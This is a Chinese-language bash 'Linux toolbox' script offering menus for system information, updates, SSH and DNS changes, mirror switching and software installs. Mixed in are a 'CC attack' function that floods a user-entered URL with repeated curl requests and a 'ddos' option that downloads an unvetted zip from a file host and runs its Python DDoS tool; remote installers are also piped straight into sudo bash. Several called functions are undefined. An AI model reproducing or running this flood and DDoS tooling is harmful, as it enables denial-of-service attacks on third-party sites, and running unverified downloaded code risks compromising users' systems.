#!/bin/bash
#本脚本由NAS油条制作


# 函数：检查并安装 dialog
install_dialog() {
# 检查是否安装了 dialog
if ! command -v dialog &> /dev/null; then
    echo "dialog 未安装，正在尝试安装..."
    # 检测包管理器并安装 dialog
    if command -v apt-get &> /dev/null; then
        sudo apt-get update -y && sudo apt-get install -y dialog
    elif command -v dnf &> /dev/null; then
        sudo dnf check-update -y && sudo dnf install -y dialog
    elif command -v yum &> /dev/null; then
        sudo yum check-update -y && sudo yum install -y dialog
    else
        echo "未检测到支持的包管理器。请手动安装 dialog。"
        exit 1
    fi
# 检查安装是否成功
    if command -v dialog &> /dev/null; then
        echo "dialog 安装成功。"
    else
        echo "dialog 安装失败。请手动检查问题。"
        exit 1
    fi
else
    echo "dialog 已经安装，跳过安装步骤。"
fi
}



#变量
tempfile=$(mktemp 2>/dev/null) || tempfile=/tmp/test$$
uptime=$(uptime -p) #原版命令变量
uptime_cn=$(echo $uptime | sed 's/up/已运行/; s/hour/时/; s/minutes/分/; s/day/天/; s/months/月/')
server_ip=$(hostname -I)

server_ip() {
echo "当前IP为: $server_ip"
}
uptime_cn() {
echo "系统已运行: $uptime_cn"
}
br() {
echo -e "\e[1;34m------------------\e[0m"
}
esc() {
read -p "按回车键继续..."
}


#检查
introduce() {
clear
# 检查是否以 root 权限运行
if [[ $EUID -ne 0 ]]; then
   echo "建议使用 root 权限运行此脚本。" 
   read -p "回车键继续"
fi

#检查dialog是否安装
if command -v dialog &> /dev/null
then
    echo "dialog 已经安装，跳过安装步骤。"
else 
    install_dialog
fi
}


#主菜单
show_menu() {
dialog --title "NAS油条Linux工具箱" \
--menu "本工具箱由NAS油条制作\nQQ群:610699712\n请选择你要启动的项目：" \
0 0 10 \
1 "工具箱初始化" \
2 "系统查看菜单" \
3 "网络常用工具" \
4 "安装常用工具" \
0 "退出" \
2> $tempfile
choice=$(cat $tempfile)
#
}


#查看菜单
look_menu() {
  clear
  br
  echo "1) 系统运行时间"
  echo "2) 配置信息"
  echo "3) 本机IP"
  echo "0) 返回上层"
  
}

# 系统操作菜单
system_menu() {
    clear
    br
    echo "1. 一键重启服务器"
    echo "2. 一键修改密码"
    echo "3. 一键同步上海时间"
    echo "4. 一键修改SSH端口"
    echo "5. 一键修改DNS"
    echo "6. 一键开启/关闭SSH登录"
    echo "7. 一键更新CentOS最新版系统"
    echo "8. 一键更新Ubuntu最新版系统"
    echo "9. 一键更新Debian最新版系统"
    echo "0. 返回上级菜单"
    br
}

often_tool() {
clear
br
echo "1) 安装alist"
echo "2) 安装宝塔面板"
echo "3) 安装cpolar"
echo "4) 安装ddos"
echo "0) 返回上层菜单"
br
}


Internet_tool() {
clear
br
echo "1) ping工具"
echo "2) CC攻击"
echo "0) 返回上层菜单"
br
}





csh() {
clear
echo 安装curl git dialog中
apt install curl git dialog -y
echo 安装完成
esc
}




ping2() {
read -p "请输入ping地址: " ping
ping $ping
}

cc() {
echo "无"
}

cpolar_instell() {
echo "选择你的框架"
echo "1) AMD通用安装"
echo "2) Aarch64(无)"
echo "0) 退出"
read -p "请输入选项（1-2）: " opt
case $opt in
1) curl -L https://www.cpolar.com/static/downloads/install-release-cpolar.sh | sudo bash ;;
2) bash nasyt-linux-tool/cpolar/aarch64.sh ;;
0) exit 1 ;;
*) echo "无效的输入。" ;;
esac
sleep 1s
echo "脚本结束。"
}






cc() {
echo ----CC攻击----
read -p "请输入攻击地址" url
read -p "请输入攻击数量:" sl
echo 正在攻击ing...
for ((i=0; i<$sl; i++)); do

curl -s $url > /dev/null

done
echo "CC攻击完成"
}
ddos() {
echo 按回车后开始安装。
read
clear
echo 切换清华下载源
sleep 1s
echo
sed -i 's@^\(deb.*stable main\)$@#\1\ndeb https://mirrors.tuna.tsinghua.edu.cn/termux/termux-packages-24 stable main@' $PREFIX/etc/apt/sources.list
clear
sleep 1s
echo 更新资源中
echo 途中请输入y回车
sleep 2s
apt update
apt upgrade
echo 更新完成
clear
echo 正在安装 figlet
sleep 1s
pkg install figlet
clear
echo 正在安装 python
echo 途中可能会停止请输入y继续
echo 等的时间可能有点长,请耐心等待。
sleep 2s
pkg install python
clear
echo 当前 python 版本
sleep 1s
python -V
sleep 2s
clear
echo 正在安装 ddos
curl -o ddos.zip https://cccimg.com/down.php/576c81c114e3a3c1b3e702bd19117594.zip
unzip ddos.zip
sleep 1s
clear
echo 以后请输入以下命令启动
echo python ddos/ddos.py
echo
echo 按回车键继续
read
cd ddos
echo ⑥正在启动ddos
sleep 2s
python ddos.py

}
# 函数：显示服务器配置信息
show_server_config() {
    clear
    echo "=== 服务器配置信息 ==="
    echo "CPU核心数:"
    lscpu | grep -w "CPU(s):" | grep -v "\-"
    lscpu | grep -w "Model name:"
    echo "CPU频率:"
    lscpu | grep -w "CPU MHz"
    echo "虚拟化类型:"
    lscpu | grep -w "Hypervisor vendor:"
   echo "系统版本:"
    if [ -f /etc/lsb-release ]; then
        . /etc/lsb-release
        echo "Ubuntu $DISTRIB_RELEASE"
    elif [ -f /etc/debian_version ]; then
        DEBIAN_VERSION=$(cat /etc/debian_version)
        echo "Debian $DEBIAN_VERSION"
    elif [ -f /etc/centos-release ]; then
        CENTOS_VERSION=$(cat /etc/centos-release)
        echo "CentOS $CENTOS_VERSION"
    else
        echo "无法识别的系统类型"
    fi
    echo "内存信息:"
    free -h
    echo "硬盘信息:"
    df -h
    esc
}


# 重启服务器
restart_server() {
    read -p "确认要重启服务器吗？(y/n): " confirm
    if [[ $confirm == [yY] ]]; then
        echo "正在重启服务器..."
        # 在这里添加重启服务器的命令
        sudo reboot
    else
        echo "取消重启服务器"
    fi
}

# 一键修改密码
change_password() {
    username=$(whoami)
    sudo passwd "$username"
    echo "密码已成功修改。"
}

# 函数：显示服务器地理位置
show_server_location() {
    curl ipinfo.io
}

# 函数：显示服务器地理位置（中文）
show_server_location2() {
    curl iplark.com
}



# 同步上海时间函数
sync_shanghai_time() {
    install_ntpdate
    echo "正在同步上海时间..."
    sudo timedatectl set-timezone Asia/Shanghai
    sudo ntpdate cn.pool.ntp.org
    echo "时间同步完成。"
}

# 一键修改 SSH 端口
change_ssh_port() {
    read -p "请输入新的 SSH 端口: " new_port
    sed -i "s/Port [0-9]*/Port $new_port/" /etc/ssh/sshd_config
    systemctl restart sshd
    echo "SSH 端口已修改为 $new_port"
}

# 函数：一键修改DNS1和DNS2
function set_dns() {
    read -p "请输入新的DNS服务器地址: " dns_server
    if [[ -f /etc/redhat-release ]]; then
        # CentOS
        echo "nameserver $dns_server" | sudo tee /etc/resolv.conf >/dev/null
        echo "DNS服务器已修改为 $dns_server"
    elif [[ -f /etc/lsb-release ]]; then
        # Ubuntu
        sudo sed -i "s/nameserver .*/nameserver $dns_server/" /etc/resolv.conf
        echo "DNS服务器已修改为 $dns_server"
    elif [[ -f /etc/debian_version ]]; then
        # Debian
        sudo sed -i "s/nameserver .*/nameserver $dns_server/" /etc/resolv.conf
        echo "DNS服务器已修改为 $dns_server"
    else
        echo "不支持的操作系统"
    fi
}




# 一键更新 CentOS 最新版系统
update_centos() {
    read -p "确认要更新 CentOS 最新版系统吗？(y/n): " confirm
    if [[ $confirm == [yY] ]]; then
        echo "正在更新 CentOS 最新版系统..."
        # 在这里添加更新 CentOS 的命令
        sudo yum update
        echo "CentOS 最新版系统更新完成"
        reboot
    else
        echo "取消更新 CentOS 最新版系统"
    fi
}

# 一键更新 Ubuntu 最新版系统
update_ubuntu() {
    read -p "确认要更新 Ubuntu 最新版系统吗？(y/n): " confirm
    if [[ $confirm == [yY] ]]; then
        echo "正在更新 Ubuntu 最新版系统..."
        # 在这里添加更新 Ubuntu 的命令
        sudo apt update
        sudo apt upgrade -y
        echo "Ubuntu 最新版系统更新完成"
        reboot
    else
        echo "取消更新 Ubuntu 最新版系统"
    fi
}



# 函数：切换KSM状态
toggle_ksm() {
    ksm_status=$(cat /sys/kernel/mm/ksm/run)
    if [ $ksm_status -eq 0 ]; then
        /bin/systemctl start ksm
        /bin/systemctl start ksmtuned
        cat /sys/kernel/mm/ksm/run
        echo "KSM内存回收已开启。"
    else
        /bin/systemctl stop ksmtuned
        /bin/systemctl stop ksm
        echo 0 > /sys/kernel/mm/ksm/run
        echo "KSM内存回收已关闭。"
    fi
}

# 一键更新 Debian 最新版系统
update_debian() {
    read -p "确认要更新 Debian 最新版系统吗？(y/n): " confirm
    if [[ $confirm == [yY] ]]; then
        echo "正在更新 Debian 最新版系统..."
        # 在这里添加更新 Debian 的命令
        sudo apt update
        sudo apt upgrade -y
        echo "Debian 最新版系统更新完成"
        reboot
    else
        echo "取消更新 Debian 最新版系统"
    fi
}



# 更换CentOS 7源为阿里云源的函数
change_centos_to_aliyun() {
    if [ -f /etc/yum.repos.d/CentOS-Base.repo ]; then
        echo "正在更换CentOS的源为阿里云源..."
        sudo cp /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.backup
        cat << 'EOF' | sudo tee /etc/yum.repos.d/CentOS-Base.repo
[base]
name=CentOS-$releasever - Base - 阿里云镜像
baseurl=http://mirrors.aliyun.com/centos/$releasever/os/$basearch/
gpgcheck=1
gpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-7

# 可选的，添加阿里云的额外源
[extras]
name=CentOS-$releasever - Extras - 阿里云镜像
baseurl=http://mirrors.aliyun.com/centos/$releasever/extras/$basearch/
gpgcheck=1
gpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-7

# 可选的，添加阿里云的更新源
[updates]
name=CentOS-$releasever - Updates - 阿里云镜像
baseurl=http://mirrors.aliyun.com/centos/$releasever/updates/$basearch/
gpgcheck=1
gpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-7
EOF
        sudo yum clean all
        sudo yum makecache
        echo "CentOS源更换完成。"
    else
        echo "CentOS源配置文件不存在。"
    fi
}

# 更换Ubuntu 20.04源为阿里云源的函数
change_ubuntu_to_aliyun() {
    if [ -f /etc/apt/sources.list ]; then
        echo "正在更换Ubuntu的源为阿里云源..."
        sudo cp /etc/apt/sources.list /etc/apt/sources.list.backup
        sudo sed -i 's/archive.ubuntu.com/mirrors.aliyun.com/g' /etc/apt/sources.list
        sudo sed -i 's/security.ubuntu.com/mirrors.aliyun.com/g' /etc/apt/sources.list
        echo "Ubuntu源更换完成。"
    else
        echo "Ubuntu源配置文件不存在。"
    fi
}



# 更换Debian源为阿里云源的函数
change_debian_to_aliyun() {
    if [ -f /etc/apt/sources.list ]; then
        echo "正在更换Debian的源为阿里云源..."
        sudo cp /etc/apt/sources.list /etc/apt/sources.list.backup
        sudo sed -i 's|http://[^ ]*|http://mirrors.aliyun.com|' /etc/apt/sources.list
        echo "Debian源更换完成。"
    else
        echo "Debian源配置文件不存在。"
    fi
}




#开始
while true
do
introduce  #简介
show_menu  #主菜单
case $choice in
       csh)
          csh;;
          #工具箱初始化
       1)
          #查看功能
          while true
          do
          look_menu
          read -p "请输入选项: " csh_xz
          case $csh_xz in
              1)
                 uptime_cn #运行时间
                 esc
                 ;;
              2)
                 clear
                 show_server_config #系统配置
                 esc
                 ;;
              3)
                 server_ip #本机IP
                 esc
                 ;;
              0) break;;
              *)
                 echo "无效的输入。"
                 esc
                 ;;
            esac
          done
          ;;
       2)
          while true
            do
              system_menu
              read -p "请输入选项: " system_choice
                case $system_choice in
                    1) restart_server;;
                    2) change_password;;
                    3) sync_shanghai_time;;
                    4) change_ssh_port;;
                    5) set_dns;;
                    6) toggle_ssh;;
                    7) update_centos;;
                    8) update_ubuntu;;
                    9) update_debian;;
                    0) break;;
                    *) echo "无效的输入。";;
                esac
            done
          ;;
       3)
          while true
          do
          Internet_tool
          read -p "请输入选项: " Internet_tool
             case $Internet_tool in
               1) ping2;;
               2) cc;;
             esac
          done
          ;;
       4)
          while true
          do
            often_tool
            read -p "请输入选项: " often_tool
              case $often_tool in
                1)apt install alist -y;;
                2)
                   if [ -f /usr/bin/curl ];then curl -sSO https://download.bt.cn/install/install_panel.sh;else wget -O install_panel.sh https://download.bt.cn/install/install_panel.sh;fi;bash install_panel.sh ed8484bec
                   read -p "安装bt完成 回车键返回。"
                   ;;
                3)
                   cpolar_instell
                   esc
                   ;;
                4)
                   ddos
                   esc
                   ;;
                0) break;;
                *)
                   echo "无效的输入。"
                   esc
                   ;;
              esac
            done
            ;;
       0)
          #退出循环
          break
          clear
          ;;
       *)
          echo "无效的输入。"
          esc
          ;;
     esac
done